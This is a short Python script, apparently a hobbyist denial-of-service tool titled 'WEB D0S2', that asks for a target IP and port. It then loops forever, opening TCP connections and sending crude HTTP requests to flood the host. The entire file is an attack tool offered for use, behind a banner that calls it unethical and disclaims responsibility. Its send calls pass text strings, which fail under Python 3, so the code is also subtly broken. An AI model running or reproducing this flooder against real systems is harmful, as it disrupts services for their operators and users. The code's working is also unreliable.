import socket
import os
os.system('clear')
reset = "\033[0m"
siyah = "\033[30m"
kirmizi = "\033[31m"
yesil = "\033[32m"
sari = "\033[33m"
mavi = "\033[34m"
mor = "\033[35m"
cyan = "\033[36m"
beyaz = "\033[37m"
os.system('figlet WEB D0S2')
asci="""
############################################
#                                          #
#    WE DO NOT ACCEPT RESPONSIBILITY;      #
#                                          #
#  This software is unethical,             #
#  please use it for testing purposes only.#
#  we are not responsible for any use.     #
#  --------------------------------------- # 
#                                          #
#  -$:MAKER : Yira   | TEAM : zTEAM        #
#                                          #
############################################
"""
print(kirmizi + asci + reset)
target_ip = input(sari + "IP:")
target_port = int(input("PORT:" + reset))  # Port numarasını tamsayıya dönüştürün

def ddos_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto("GET / " + target_ip + " HTTP/1.1\r\n ", (target_ip, target_port))
            sock.sendto("HOST: " + target_ip + "\r\n\r\n", (target_ip, target_port))
            sock.close()
        except socket.error:
            pass

if __name__ == "__main__":
    ddos_attack()

